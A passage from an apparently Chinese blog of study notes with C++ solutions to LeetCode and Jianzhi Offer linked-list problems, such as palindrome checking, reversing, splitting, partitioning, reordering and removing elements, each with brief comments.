i++,j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vals[i] != vals[j])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针O(n)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    找到前半部分链表的尾节点。</span></span><br><span class="line"><span class="comment">    反转后半部分链表。</span></span><br><span class="line"><span class="comment">    判断是否回文。</span></span><br><span class="line"><span class="comment">    恢复链表。</span></span><br><span class="line"><span class="comment">    返回结果。</span></span><br><span class="line"><span class="comment">寻找链表前半部分的尾结点：</span></span><br><span class="line"><span class="comment">    使用快慢指针在一次遍历中找到：慢指针一次走一步，快指针一次走两步，快慢指针同时出发。当快指针移动到链表的末尾时，慢指针恰好到链表的中间。通过慢指针将链表分为两部分。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *firstHalfEnd = <span class="built_in">endOfFirstHalf</span>(head);<span class="comment">//寻找链表前半部分的尾结点</span></span><br><span class="line">        ListNode *secondHalfStart = <span class="built_in">reverseList</span>(firstHalfEnd-&gt;next);<span class="comment">//逆置 链表后半部分</span></span><br><span class="line">        <span class="comment">//比较两个链表（分别为前半部分和后半部分）</span></span><br><span class="line">        ListNode *p1 = head;</span><br><span class="line">        ListNode *p2 = secondHalfStart;</span><br><span class="line">        <span class="keyword">bool</span> res = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(res &amp;&amp; p2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1-&gt;val != p2-&gt;val)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">            p2 = p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        firstHalfEnd-&gt;next = <span class="built_in">reverseList</span>(secondHalfStart);<span class="comment">//恢复原链表</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//链表逆置(反转链表)</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">reverseList</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//寻找链表前半部分尾结点（快慢指针法）</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">endOfFirstHalf</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast-&gt;next!=<span class="literal">nullptr</span> &amp;&amp; fast-&gt;next-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="剑指-Offer-06-从尾到头打印链表"><a href="#剑指-Offer-06-从尾到头打印链表" class="headerlink" title="剑指 Offer 06 从尾到头打印链表"></a>剑指 Offer 06 从尾到头打印链表</h3><p>输入一个链表的头节点，<strong>从尾到头反过来返回</strong>每个节点的值（用数组返回）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    后数组反转</span></span><br><span class="line"><span class="comment">    注意：排序 ！= 反转</span></span><br><span class="line"><span class="comment">    swap(res[i],res[res.size()-i-1]);//首尾【下标】交换</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">reversePrint</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">NULL</span>)&#123;<span class="comment">//先全部装入</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;res.<span class="built_in">size</span>()/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(res[i],res[res.<span class="built_in">size</span>()-i<span class="number">-1</span>]);<span class="comment">//首尾交换</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//或者使用  reverse(res.begin(), res.end());</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    栈：先进后出</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">reversePrint</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            s.<span class="built_in">push</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(s.<span class="built_in">top</span>());</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先反转链表，再装入</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">reversePrint</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="comment">//反转链表</span></span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;<span class="comment">//最后cur和tmp均指向原始链表的末尾null,而pre指向原始链表的尾结点</span></span><br><span class="line">        <span class="keyword">while</span>(pre)&#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(pre-&gt;val);</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="9-分隔链表——分成k份"><a href="#9-分隔链表——分成k份" class="headerlink" title="9 分隔链表——分成k份"></a>9 分隔链表——分成k份</h3><p>给你一个头结点为 head 的单链表和一个整数 k ，设计算法<strong>将链表分隔为 k 个连续的部分</strong>。<br>每部分的长度应该尽可能的相等：任意两部分的长度差距不能超过 1 。这可能会导致有些部分为 null 。<br>这 k 个部分应该按照在链表中出现的顺序排列，并且<strong>排在前面的部分的长度应该大于或等于排在后面的长度</strong>。<br>返回一个由上述 k 部分组成的数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    拆分链表</span></span><br><span class="line"><span class="comment">    得到链表的长度 n 之后，记 </span></span><br><span class="line"><span class="comment">    quotient=n/k </span></span><br><span class="line"><span class="comment">    remainder=n mod k</span></span><br><span class="line"><span class="comment">    则在分隔成的 k 个部分中，前 remainder 个部分的长度各为 quotient+1,其余每个部分的长度各为 quotient</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;ListNode*&gt; <span class="title">splitListToParts</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">        ListNode *temp = head;</span><br><span class="line">        <span class="keyword">while</span>(temp!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            n++;            <span class="comment">//链表长度n</span></span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> quotient = n/k;     <span class="comment">//商</span></span><br><span class="line">        <span class="keyword">int</span> remainder = n%k;    <span class="comment">//余数</span></span><br><span class="line">        <span class="function">vector&lt;ListNode*&gt; <span class="title">parts</span><span class="params">(k,<span class="literal">nullptr</span>)</span></span>;<span class="comment">//存入连续 k个链表</span></span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k &amp;&amp; cur != <span class="literal">nullptr</span>; i++)&#123;<span class="comment">//k个链表</span></span><br><span class="line">            parts[i] = cur;<span class="comment">//当前链表的头结点</span></span><br><span class="line">            <span class="keyword">int</span> partSize = quotient + (i&lt;remainder?<span class="number">1</span>:<span class="number">0</span>);<span class="comment">//前remainder个链表长度是</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;partSize; j++)&#123;</span><br><span class="line">                cur = cur-&gt;next;<span class="comment">//找到当前链表的尾结点</span></span><br><span class="line">            &#125;</span><br><span class="line">            ListNode *next = cur-&gt;next;<span class="comment">//当前链表的尾结点的下一个结点，即下一个链表的头结点</span></span><br><span class="line">            cur-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//当前链表的尾结点指向null，即当前链表结束</span></span><br><span class="line">            cur = next;<span class="comment">//下一个链表的头结点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parts;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="86-分隔链表——分成-lt-x和-gt-x-连接起来"><a href="#86-分隔链表——分成-lt-x和-gt-x-连接起来" class="headerlink" title="86 分隔链表——分成&lt;x和&gt;=x 连接起来"></a>86 分隔链表——分成&lt;x和&gt;=x 连接起来</h3><p>给你一个链表的头节点 head 和一个特定值 x<br>分隔链表，<strong>使得所有 小于x 的节点都出现在 大于或等于x 的节点之前</strong>。<br>你应当 保留 两个分区中每个节点的初始相对位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    误区：second 不能先=one</span></span><br><span class="line"><span class="comment">    应该 都 new 一个新的头</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">partition</span><span class="params">(ListNode* head, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        ListNode *first = dummyHead;</span><br><span class="line">        ListNode *one = head;<span class="comment">//记录第一个&gt;=x结点</span></span><br><span class="line">        <span class="keyword">while</span>(one &amp;&amp; one-&gt;val&lt;x)</span><br><span class="line">            one = one-&gt;next;</span><br><span class="line">        ListNode *second = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;cur:&quot;</span>&lt;&lt;cur-&gt;val&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;val &lt; x)&#123;</span><br><span class="line">                first-&gt;next = cur;</span><br><span class="line">                first = cur;<span class="comment">//first最后指向&lt;x链表的最后一个结点</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                second-&gt;next = cur;</span><br><span class="line">                second = cur;<span class="comment">//second最后指向&gt;=x链表的最后一个结点</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//cout&lt;&lt;&quot;cur:&quot;&lt;&lt;cur-&gt;val&lt;&lt;endl;</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        first-&gt;next = one;<span class="comment">//两个链表 连接起来</span></span><br><span class="line">        second-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//尾结点</span></span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="10-链表元素按奇-偶聚集"><a href="#10-链表元素按奇-偶聚集" class="headerlink" title="10 链表元素按奇+偶聚集"></a>10 链表元素按奇+偶聚集</h3><p>给定单链表的头节点 head ，将所有<strong>索引</strong>为奇数的节点和<strong>索引</strong>为偶数的节点分别组合在一起，然后返回重新排序的列表<br>输入: head = [2,1,3,5,6,4,7]<br>输出: [2,3,6,7,1,5,4]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">oddEvenList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *ou = head-&gt;next;<span class="comment">//偶数索引 头结点</span></span><br><span class="line">        ListNode *ji = head;<span class="comment">//奇数索引 头结点</span></span><br><span class="line">        ListNode *cur = ou;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span> &amp;&amp; cur-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ji-&gt;next = cur-&gt;next;</span><br><span class="line">            ji = ji-&gt;next;<span class="comment">//指向下一个 奇数位结点</span></span><br><span class="line">            cur-&gt;next = ji-&gt;next;</span><br><span class="line">            cur = cur-&gt;next;<span class="comment">//指向下一个 偶数位结点</span></span><br><span class="line">        &#125;</span><br><span class="line">        ji-&gt;next = ou;<span class="comment">//奇链 连接 偶链</span></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="143-重排链表"><a href="#143-重排链表" class="headerlink" title="143 重排链表"></a>143 重排链表</h3><p>给定一个单链表 L 的头节点 head ，单链表 L 表示为：<br>L0 → L1 → … → Ln - 1 → Ln<br>请将其重新排列后变为：<br>L0 → Ln → L1 → Ln - 1 → L2 → Ln - 2 → …<br><strong>需要实际的进行节点交换</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//快慢指针 找中间结点</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">midNode</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast-&gt;next &amp;&amp; fast-&gt;next-&gt;next)&#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;<span class="comment">//反转链表</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">reverse</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(ListNode *l1, ListNode *l2)</span></span>&#123;</span><br><span class="line">        ListNode *tmp1, *tmp2;</span><br><span class="line">        <span class="keyword">while</span>(l1 &amp;&amp; l2)&#123;</span><br><span class="line">            tmp1 = l1-&gt;next;</span><br><span class="line">            tmp2 = l2-&gt;next;</span><br><span class="line">            l1-&gt;next = l2;</span><br><span class="line">            l1 = tmp1;</span><br><span class="line">            l2-&gt;next = l1;</span><br><span class="line">            l2 = tmp2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reorderList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        ListNode *mid = <span class="built_in">midNode</span>(head);</span><br><span class="line">        ListNode *l1 = head;</span><br><span class="line">        ListNode *l2 = mid-&gt;next;<span class="comment">//注意 是next</span></span><br><span class="line">        mid-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//l1 的尾结点先指向null</span></span><br><span class="line">        l2 = <span class="built_in">reverse</span>(l2);<span class="comment">//</span></span><br><span class="line">        <span class="built_in">merge</span>(l1,l2);<span class="comment">//合并 l1 和 l2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203 移除链表元素"></a>203 移除链表元素</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pre 前驱</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeElements</span><span class="params">(ListNode* head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        ListNode *p = head-&gt;next,*pre = head;<span class="comment">//前驱</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;val==val)</span><br><span class="line">                pre-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pre = p;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeElements</span><span class="params">(ListNode* head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        head-&gt;next = <span class="built_in">removeElements</span>(head-&gt;next,val);</span><br><span class="line">        <span class="keyword">return</span> head-&gt;val==val? head-&gt;next:head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代：使用 虚拟头结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeElements</span><span class="params">(ListNode* head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">       <span class="comment">//设置一个 虚拟头结点，便于对 head 操作</span></span><br><span class="line">       ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">       ListNode *pre = dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(pre-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pre-&gt;next-&gt;val==val)<span class="comment">//当前结点值 的下一个结点值等于val</span></span><br><span class="line">                pre-&gt;next = pre-&gt;next-&gt;next;<span class="comment">//当前结点指向下一个结点的下一个结点</span></span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                pre = pre-&gt;next;<span class="comment">//当前结点值后移一位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> 